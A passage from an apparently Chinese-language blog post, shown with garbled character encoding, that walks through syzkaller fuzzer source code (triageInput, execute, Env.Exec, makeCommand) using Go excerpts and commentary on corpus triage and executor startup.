åˆ™ç›´æ¥è¿”å›</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> triageInput(item *WorkTriage) &#123;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#%v: triaging type=%x&quot;</span>, proc.pid, item.flags)<br><br>prio := signalPrio(item.p, &amp;item.info, item.call)<br>inputSignal := signal.FromRaw(item.info.Signal, prio)<br>newSignal := proc.fuzzer.corpusSignalDiff(inputSignal)<br><span class="hljs-keyword">if</span> newSignal.Empty() &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>callName := <span class="hljs-string">&quot;.extra&quot;</span><br>logCallName := <span class="hljs-string">&quot;extra&quot;</span><br><span class="hljs-keyword">if</span> item.call != <span class="hljs-number">-1</span> &#123;<br>callName = item.p.Calls[item.call].Meta.Name<br>logCallName = fmt.Sprintf(<span class="hljs-string">&quot;call #%v %v&quot;</span>, item.call, callName)<br>&#125;<br>log.Logf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;triaging input for %v (new signal=%v)&quot;</span>, logCallName, newSignal.Len())<br></code></pre></td></tr></table></figure><p>å®Œæˆå‰é¢çš„è¿™äº›åˆ¤æ–­å·¥ä½œä¹‹åï¼Œæ¥ä¸‹æ¥æ¥åˆ°ä¸€ä¸ªä¼šè¿è¡Œä¸‰æ¬¡çš„å°å¾ªç¯ï¼š</p><ul><li>è°ƒç”¨ <code>proc.executeRaw()</code> <strong>å°†è¯¥è¾“å…¥é‡æ–°æ‰§è¡Œä¸€æ¬¡</strong>ï¼Œè‹¥æ‰§è¡Œå¤±è´¥ï¼ˆè¿™é‡Œçš„ <code>reexecutionSuccess()</code> ä¸»è¦æ£€æŸ¥ä¿¡å·é•¿åº¦æ˜¯å¦ä¸ä¸º 0ï¼‰åˆ™é‡æ–°å¼€å§‹å¾ªç¯ï¼Œå¤±è´¥ 2æ¬¡ç›´æ¥è¿”å›</li><li>è·å–æ‰§è¡Œæ‰€å¾—ä¿¡å·ä¸è¦†ç›–ç‡ï¼Œå°†è¦†ç›–ç‡åˆå¹¶åˆ° <code>inputCover</code> ä¸­ï¼Œå¦‚æœ <code>rawCover</code> ä¸ºç©ºåˆ™è¿˜ä¼šå¾€é‡Œè¾¹æ”¾ä¸€ä»½</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> inputCover cover.Cover<br><span class="hljs-keyword">const</span> (<br>signalRuns       = <span class="hljs-number">3</span><br>minimizeAttempts = <span class="hljs-number">3</span><br>)<br><span class="hljs-comment">// è®¡ç®—è¾“å…¥è¦†ç›–ä¸ non-flaky ä¿¡å·ä»¥æœ€å°åŒ–.</span><br>notexecuted := <span class="hljs-number">0</span><br>rawCover := []<span class="hljs-type">uint32</span>&#123;&#125;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; signalRuns; i++ &#123;<br>info := proc.executeRaw(proc.execOptsCover, item.p, StatTriage)<br><span class="hljs-keyword">if</span> !reexecutionSuccess(info, &amp;item.info, item.call) &#123;<br><span class="hljs-comment">// è°ƒç”¨æœªè¢«æ‰§è¡Œæˆ–å¤±è´¥äº†.</span><br>notexecuted++<br><span class="hljs-keyword">if</span> notexecuted &gt; signalRuns/<span class="hljs-number">2</span>+<span class="hljs-number">1</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-comment">// å‘ç”Ÿå¾—å¤ªé¢‘ç¹ï¼Œæ”¾å¼ƒ</span><br>&#125;<br><span class="hljs-keyword">continue</span><br>&#125;<br>thisSignal, thisCover := getSignalAndCover(item.p, info, item.call)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(rawCover) == <span class="hljs-number">0</span> &amp;&amp; proc.fuzzer.fetchRawCover &#123;<br>rawCover = <span class="hljs-built_in">append</span>([]<span class="hljs-type">uint32</span>&#123;&#125;, thisCover...)<br>&#125;<br>newSignal = newSignal.Intersection(thisSignal)<br><span class="hljs-comment">// æ²¡æœ‰ !minimized æ£€æŸ¥çš„æƒ…å†µä¸‹ manager åœ¨æ¯æ¬¡é‡å¯åå¼€å§‹ä¸¢å¤±ç›¸å½“å¤§é‡çš„è¦†ç›–ç‡.</span><br><span class="hljs-comment">// Mechanics of this are not completely clear.</span><br><span class="hljs-keyword">if</span> newSignal.Empty() &amp;&amp; item.flags&amp;ProgMinimized == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>inputCover.Merge(thisCover)<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œè¿™ä¸ª <code>Merge()</code> å…¶å®ç¬”è€…æ²¡å¤ªçœ‹æ˜ç™½ :ï¼ˆ</p><p>ç›®å‰ç¬”è€…æ¨æµ‹ <code>pc</code> æ˜¯ <code>program counter</code> ï¼Œè¿™æ ·æ¯”è¾ƒèƒ½è¯´å¾—é€šï¼Œä¸è¿‡è¿™æ ·ä¸ºä»€ä¹ˆä¸ç”¨ <code>map[uint32]bool</code> å‘¢ï¼Ÿ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(cov *Cover)</span></span> Merge(raw []<span class="hljs-type">uint32</span>) &#123;<br>c := *cov<br><span class="hljs-keyword">if</span> c == <span class="hljs-literal">nil</span> &#123;<br>c = <span class="hljs-built_in">make</span>(Cover)<br>*cov = c<br>&#125;<br><span class="hljs-keyword">for</span> _, pc := <span class="hljs-keyword">range</span> raw &#123;<br>c[pc] = <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>å¾ªç¯ç»“æŸåä¼šæ£€æŸ¥ item çš„æ ‡å¿—ä½ï¼Œå¦‚æœæœªè®¾ç½® <code>ProgMinimized</code> è¯´æ˜è¯¥è¾“å…¥è¿˜æœªè¿›è¡Œæœ€å°åŒ–ï¼Œ<strong>æ­¤æ—¶è°ƒç”¨</strong> <code>prog.Minimize()</code> <strong>å°†è¾“å…¥è¿›è¡Œæœ€å°åŒ–</strong></p><p>è¿™é‡Œä¼ å…¥çš„é—­åŒ…å‡½æ•°ä¸»è¦æ˜¯ä¸€ä¸ª <code>minimizeAttempts</code> ï¼ˆ3ï¼‰æ¬¡çš„å°å¾ªç¯ï¼Œå…¶ä¸­ä¼šè°ƒç”¨ <code>proc.execute()</code> æ‰§è¡Œæœ€å°åŒ–åçš„ç¨‹åºï¼Œæ‰§è¡Œå¤±è´¥åˆ™è¿”å›ï¼Œè‹¥ä¸‰æ¬¡å¾ªç¯æ‰§è¡Œä¸­æ— æ³•å†äº§ç”Ÿæ–°çš„ä¿¡å·ä¿¡å·åˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å› false</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> item.flags&amp;ProgMinimized == <span class="hljs-number">0</span> &#123;<br>item.p, item.call = prog.Minimize(item.p, item.call, <span class="hljs-literal">false</span>,<br><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p1 *prog.Prog, call1 <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; minimizeAttempts; i++ &#123;<br>info := proc.execute(proc.execOpts, p1, ProgNormal, StatMinimize)<br><span class="hljs-keyword">if</span> !reexecutionSuccess(info, &amp;item.info, call1) &#123;<br><span class="hljs-comment">// The call was not executed or failed.</span><br><span class="hljs-keyword">continue</span><br>&#125;<br>thisSignal, _ := getSignalAndCover(p1, info, call1)<br><span class="hljs-keyword">if</span> newSignal.Intersection(thisSignal).Len() == newSignal.Len() &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åå°†è¿™ä¸ªè¾“å…¥åºåˆ—åŒ–å<strong>å‘é€ç»™ syz-manager å¹¶å°†å…¶æ·»åŠ åˆ°æœ¬åœ°è¯­æ–™åº“ä¸­</strong>ï¼Œå¦‚æœæœªè®¾ç½® <code>ProgSmashed</code> æ ‡å¿—ä½åˆ™å†å°†è¿™ä¸ªè¾“å…¥æ”¾åˆ° WorkSmash é˜Ÿåˆ—ä¸­</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go">data := item.p.Serialize()<br>sig := hash.Hash(data)<br><br>log.Logf(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;added new input for %v to corpus:\n%s&quot;</span>, logCallName, data)<br>proc.fuzzer.sendInputToManager(rpctype.Input&#123;<br>Call:     callName,<br>CallID:   item.call,<br>Prog:     data,<br>Signal:   inputSignal.Serialize(),<br>Cover:    inputCover.Serialize(),<br>RawCover: rawCover,<br>&#125;)<br><br>proc.fuzzer.addInputToCorpus(item.p, inputSignal, sig)<br><br><span class="hljs-keyword">if</span> item.flags&amp;ProgSmashed == <span class="hljs-number">0</span> &#123;<br>proc.fuzzer.workQueue.enqueue(&amp;WorkSmash&#123;item.p, item.call&#125;)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="â‘¡-proc-execute-ï¼šæ‰§è¡Œè¾“å…¥ï¼Œå°†æœ‰æ„æ€çš„è¾“å…¥æ”¾åˆ°-traige-é˜Ÿåˆ—"><a href="#â‘¡-proc-execute-ï¼šæ‰§è¡Œè¾“å…¥ï¼Œå°†æœ‰æ„æ€çš„è¾“å…¥æ”¾åˆ°-traige-é˜Ÿåˆ—" class="headerlink" title="â‘¡ proc.execute()ï¼šæ‰§è¡Œè¾“å…¥ï¼Œå°†æœ‰æ„æ€çš„è¾“å…¥æ”¾åˆ° traige é˜Ÿåˆ—"></a>â‘¡ proc.execute()ï¼šæ‰§è¡Œè¾“å…¥ï¼Œå°†æœ‰æ„æ€çš„è¾“å…¥æ”¾åˆ° traige é˜Ÿåˆ—</h3><p>è¯¥å‡½æ•°çš„é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œä¸»è¦ä¾¿æ˜¯è°ƒç”¨ <code>proc.executeRaw()</code> æ‰§è¡Œä¼ å…¥çš„è¾“å…¥ï¼Œå¹¶è°ƒç”¨ <code>checkNewSignal()</code> æ£€æŸ¥æ‰§è¡Œçš„ç»“æœï¼Œå°†å…¶ä¸­æœ‰æ„æ€çš„é‚£äº›æ”¾å…¥ traige é˜Ÿåˆ—ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> execute(execOpts *ipc.ExecOpts, p *prog.Prog, flags ProgTypes, stat Stat) *ipc.ProgInfo &#123;<br>info := proc.executeRaw(execOpts, p, stat)<br><span class="hljs-keyword">if</span> info == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>calls, extra := proc.fuzzer.checkNewSignal(p, info)<br><span class="hljs-keyword">for</span> _, callIndex := <span class="hljs-keyword">range</span> calls &#123;<br>proc.enqueueCallTriage(p, flags, callIndex, info.Calls[callIndex])<br>&#125;<br><span class="hljs-keyword">if</span> extra &#123;<br>proc.enqueueCallTriage(p, flags, <span class="hljs-number">-1</span>, info.Extra)<br>&#125;<br><span class="hljs-keyword">return</span> info<br>&#125;<br></code></pre></td></tr></table></figure><p><code>executeRaw()</code> å‡½æ•°çš„ä¸»è¦é€»è¾‘å…¶å®å°±æ˜¯å…ˆæ£€æŸ¥ç¦ç”¨çš„ç³»ç»Ÿè°ƒç”¨ç„¶åæ˜¯ä¸€ä¸ªä¼ªæ— é™å¾ªç¯è°ƒç”¨ <code>proc.env.Exec()</code> æ‰§è¡Œè¾“å…¥ï¼ˆå¥½å¤šå±‚å¥—å¨ƒï¼‰ï¼Œè‹¥æ‰§è¡Œå¤±è´¥åˆ™è¿›è¡Œé”™è¯¯è®°å½•å¹¶ä¼‘çœ  1s åé‡æ–°è¿›è¡Œï¼Œæ‰§è¡ŒæˆåŠŸåˆ™ç›´æ¥è¿”å›</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> executeRaw(opts *ipc.ExecOpts, p *prog.Prog, stat Stat) *ipc.ProgInfo &#123;<br>proc.fuzzer.checkDisabledCalls(p)<br><br><span class="hljs-comment">// é™åˆ¶å¹¶å‘çª—å£ï¼Œæ¯éš”ä¸€æ®µæ—¶é—´è¿›è¡Œä¸€æ¬¡æ³„æ¼æ£€æŸ¥.</span><br>ticket := proc.fuzzer.gate.Enter()<br><span class="hljs-keyword">defer</span> proc.fuzzer.gate.Leave(ticket)<br><br>proc.logProgram(opts, p)<br><span class="hljs-keyword">for</span> try := <span class="hljs-number">0</span>; ; try++ &#123;<br>atomic.AddUint64(&amp;proc.fuzzer.stats[stat], <span class="hljs-number">1</span>)<br>output, info, hanged, err := proc.env.Exec(opts, p)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> err == prog.ErrExecBufferTooSmall &#123;<br><span class="hljs-comment">// è‹¥æˆ‘ä»¬ç³»ç»Ÿåœ°åœ¨åºåˆ—åŒ–ç¨‹åºä¸Šå¤±è´¥åˆ™éå¸¸ç³Ÿç³•,</span><br><span class="hljs-comment">// ä½†ç›®å‰ä¸ºæ­¢é™¤äº†ç»Ÿè®¡ä»¥å¤–æˆ‘ä»¬æ²¡æœ‰æ›´å¥½çš„å¤„ç†æ–¹å¼.</span><br><span class="hljs-comment">// è¯¥é”™è¯¯åœ¨ seeded seeded syz_mount_image è°ƒç”¨ä¸Šè§‚å¯Ÿåˆ°å¾ˆå¤š.</span><br>atomic.AddUint64(&amp;proc.fuzzer.stats[StatBufferTooSmall], <span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">if</span> try &gt; <span class="hljs-number">10</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;executor %v failed %v times: %v&quot;</span>, proc.pid, try, err)<br>&#125;<br>log.Logf(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;fuzzer detected executor failure=&#x27;%v&#x27;, retrying #%d&quot;</span>, err, try+<span class="hljs-number">1</span>)<br>debug.FreeOSMemory()<br>time.Sleep(time.Second)<br><span class="hljs-keyword">continue</span><br>&#125;<br>log.Logf(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;result hanged=%v: %s&quot;</span>, hanged, output)<br><span class="hljs-keyword">return</span> info<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Env-Exec-ï¼šå¯åŠ¨-syz-executor-å¹¶å°†è¾“å…¥ç¨‹åºåºåˆ—åŒ–åäº¤ç»™å…¶æ‰§è¡Œ"><a href="#Env-Exec-ï¼šå¯åŠ¨-syz-executor-å¹¶å°†è¾“å…¥ç¨‹åºåºåˆ—åŒ–åäº¤ç»™å…¶æ‰§è¡Œ" class="headerlink" title="Env.Exec()ï¼šå¯åŠ¨ syz-executor å¹¶å°†è¾“å…¥ç¨‹åºåºåˆ—åŒ–åäº¤ç»™å…¶æ‰§è¡Œ"></a>Env.Exec()ï¼šå¯åŠ¨ syz-executor å¹¶å°†è¾“å…¥ç¨‹åºåºåˆ—åŒ–åäº¤ç»™å…¶æ‰§è¡Œ</h4><p><code>Env.Exec()</code> å‡½æ•°ç”¨æ¥å¯åŠ¨ syz-executor å¹¶å°†è¾“å…¥äº¤ç»™å…¶è¿›è¡Œæ‰§è¡Œï¼Œ<strong>syz-executor åœ¨è¢«å¯åŠ¨åä¼šä¸€ç›´ç­‰å¾… syz-fuzzer ä¼ æ¥çš„è¾“å…¥å¹¶æ‰§è¡Œ</strong>ï¼Œè€Œä¸æ˜¯æ¯ä¸ªè¾“å…¥éƒ½è¦é‡æ–°å¯åŠ¨ä¸€æ¬¡ executorï¼š</p><ul><li>é¦–å…ˆå°†è¾“å…¥åºåˆ—åŒ–åˆ° <code>env.in</code> ï¼ˆä½œä¸º syz-executor çš„è¾“å…¥ï¼Œsyz-executor ä¼šååºåˆ—åŒ–åå†å°†å…¶æ‰§è¡Œï¼‰ï¼Œå¹¶å°† <code>env.out</code> çš„å‰ 4 å­—èŠ‚ï¼ˆ<code>ncmd and nsig</code> ï¼‰ç½® 0ï¼›è¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ° syz-fuzzer ä¸ syz-executor é—´æœ‰ä¸¤ç§ä¼ é€’æ•°æ®çš„æ–¹å¼ï¼šç®¡é“&#x2F;å…±äº«å†…å­˜</li><li>æ¥ä¸‹æ¥æ£€æŸ¥ executor æ˜¯å¦å·²å¯åŠ¨ï¼Œè‹¥æœªå¯åŠ¨ï¼ˆ <code>env.cmd == nil</code> ï¼‰åˆ™è°ƒç”¨ <code>makeCommand()</code> <strong>å¯åŠ¨ syz-executor</strong></li><li>æ¥ä¸‹æ¥è°ƒç”¨ <code>cmd.exec()</code> <strong>çœŸæ­£å¼€å§‹è®© syz-executor æ‰§è¡Œç¨‹åº</strong>ï¼Œè‹¥å‡ºé”™åˆ™å…³é—­ syz-executorï¼ˆç­‰ <code>executeRaw()</code> çš„ä¸‹æ¬¡å¾ªç¯é‡æ–°å¯åŠ¨ï¼‰</li><li>æœ€åè§£æç¨‹åºè¾“å‡ºï¼Œè¿”å›ç»“æœ</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Exec å¯åŠ¨ executor äºŒè¿›åˆ¶æ–‡ä»¶ä»¥æ‰§è¡Œç¨‹åº p å¹¶è¿”å›å…³äºæ‰§è¡Œçš„ä¿¡æ¯:</span><br><span class="hljs-comment">// output: ç¨‹åºè¾“å‡º</span><br><span class="hljs-comment">// info: per-call info</span><br><span class="hljs-comment">// hanged: ç¨‹åºæŒ‚èµ·ä¸”è¢«æ€æ­»</span><br><span class="hljs-comment">// err0: å¯åŠ¨ç¨‹åºå¤±è´¥æˆ–æ˜¯ executor è‡ªèº«æœ‰é—®é¢˜.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(env *Env)</span></span> Exec(opts *ExecOpts, p *prog.Prog) (output []<span class="hljs-type">byte</span>, info *ProgInfo, hanged <span class="hljs-type">bool</span>, err0 <span class="hljs-type">error</span>) &#123;<br><span class="hljs-comment">// Copy-in serialized program.</span><br>progSize, err := p.SerializeForExec(env.in)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>err0 = err<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">var</span> progData []<span class="hljs-type">byte</span><br><span class="hljs-keyword">if</span> !env.config.UseShmem &#123;<br>progData = env.in[:progSize]<br>&#125;<br><span class="hljs-comment">// æ¸…é›¶å‰ä¸¤ä¸ªå­— (ncmd and nsig), ç”±æ­¤è‹¥ executor åœ¨å†™å…¥éåƒåœ¾æ•°æ®å‰å´©æºƒï¼Œ</span><br><span class="hljs-comment">// æˆ‘ä»¬åœ¨è¿™é‡Œä¾¿æ²¡æœ‰åƒåœ¾.</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++ &#123;<br>env.out[i] = <span class="hljs-number">0</span><br>&#125;<br><br>atomic.AddUint64(&amp;env.StatExecs, <span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> env.cmd == <span class="hljs-literal">nil</span> &#123; <span class="hljs-comment">/* syz-executor æœªå¯åŠ¨ */</span><br><span class="hljs-keyword">if</span> p.Target.OS != targets.TestOS &amp;&amp; targets.Get(p.Target.OS, p.Target.Arch).HostFuzzer &#123;<br><span class="hljs-comment">// executor å®é™…ä¸Šæ˜¯ ssh,</span><br><span class="hljs-comment">// å¤ªé¢‘ç¹åœ°å¯åŠ¨ä»–ä»¬ä¼šå¯¼è‡´å»¶è¿Ÿ.</span><br>&lt;-rateLimit.C<br>&#125;<br>tmpDirPath := <span class="hljs-string">&quot;./&quot;</span><br>atomic.AddUint64(&amp;env.StatRestarts, <span class="hljs-number">1</span>)<br>env.cmd, err0 = makeCommand(env.pid, env.bin, env.config, env.inFile, env.outFile, env.out, tmpDirPath)<br><span class="hljs-keyword">if</span> err0 != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>output, hanged, err0 = env.cmd.exec(opts, progData)<span class="hljs-comment">/* æ‰§è¡Œè¾“å…¥ */</span><br><span class="hljs-keyword">if</span> err0 != <span class="hljs-literal">nil</span> &#123; <span class="hljs-comment">/* å‡ºé”™ï¼Œå…³é—­ executor */</span><br>env.cmd.<span class="hljs-built_in">close</span>()<br>env.cmd = <span class="hljs-literal">nil</span><br><span class="hljs-keyword">return</span><br>&#125;<br><br>info, err0 = env.parseOutput(p, opts)<br><span class="hljs-keyword">if</span> info != <span class="hljs-literal">nil</span> &amp;&amp; env.config.Flags&amp;FlagSignal == <span class="hljs-number">0</span> &#123;<br>addFallbackSignal(p, info)<br>&#125;<br><span class="hljs-keyword">if</span> !env.config.UseForkServer &#123;<br>env.cmd.<span class="hljs-built_in">close</span>()<br>env.cmd = <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ã€æ ¸å¿ƒã€‘makeCommand-ï¼šå»ºç«‹é€šä¿¡ç®¡é“ï¼Œå¯åŠ¨-syz-executor"><a href="#ã€æ ¸å¿ƒã€‘makeCommand-ï¼šå»ºç«‹é€šä¿¡ç®¡é“ï¼Œå¯åŠ¨-syz-executor" class="headerlink" title="ã€æ ¸å¿ƒã€‘makeCommand()ï¼šå»ºç«‹é€šä¿¡ç®¡é“ï¼Œå¯åŠ¨ syz-executor"></a>ã€æ ¸å¿ƒã€‘makeCommand()ï¼šå»ºç«‹é€šä¿¡ç®¡é“ï¼Œå¯åŠ¨ syz-executor</h4><p><code>makeCommand()</code> å‡½æ•°æ˜¯çœŸæ­£å¯åŠ¨ syz-executor çš„å‡½æ•°ï¼Œå…¶é¦–å…ˆä¼šå…ˆåˆ›å»ºä¸€ä¸ªä¸´æ—¶æ–‡ä»¶å¤¹ <code>syzkaller-testdir</code> å¹¶æ›´æ”¹æƒé™ä¸º <code>0777</code>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">makeCommand</span><span class="hljs-params">(pid <span class="hljs-type">int</span>, bin []<span class="hljs-type">string</span>, config *Config, inFile, outFile *os.File, outmem []<span class="hljs-type">byte</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">tmpDirPath <span class="hljs-type">string</span>)</span></span> (*command, <span class="hljs-type">error</span>) &#123;<br>dir, err := os.MkdirTemp(tmpDirPath, <span class="hljs-string">&quot;syzkaller-testdir&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create temp dir: %v&quot;</span>, err)<br>&#125;<br>dir = osutil.Abs(dir)<br><br>timeout := config.Timeouts.Program<br><span class="hljs-keyword">if</span> config.UseForkServer &#123;<br><span class="hljs-comment">// åœ¨å¯ç”¨äº† fork server æ—¶ï¼ŒExecutor æœ‰ä¸€ä¸ªå†…éƒ¨çš„ timeoutï¼Œå¯ä»¥é˜²æ­¢å¤§éƒ¨åˆ†çš„æŒ‚èµ·ï¼Œ</span><br><span class="hljs-comment">// å› æ­¤æˆ‘ä»¬ç”¨ä¸€ä¸ªéå¸¸å¤§çš„ timeout. Executor å¯ä»¥å› ä¸ºå‘½åç©ºé—´ä¸­çš„å…¨å±€é”ä¸å…¶ä»–ä¸œè¥¿è€Œå˜æ…¢ï¼Œ</span><br><span class="hljs-comment">// æ•…æˆ‘ä»¬æœ€å¥½ç­‰å¾…ï¼Œè€Œéä¸ŠæŠ¥è™šå‡çš„è¯¯å¯¼æ€§ crashes.</span><br>timeout *= <span class="hljs-number">10</span><br>&#125;<br><br>c := &amp;command&#123;<br>pid:     pid,<br>config:  config,<br>timeout: timeout,<br>dir:     dir,<br>outmem:  outmem,<br>&#125;<br><span class="hljs-keyword">defer</span> <span 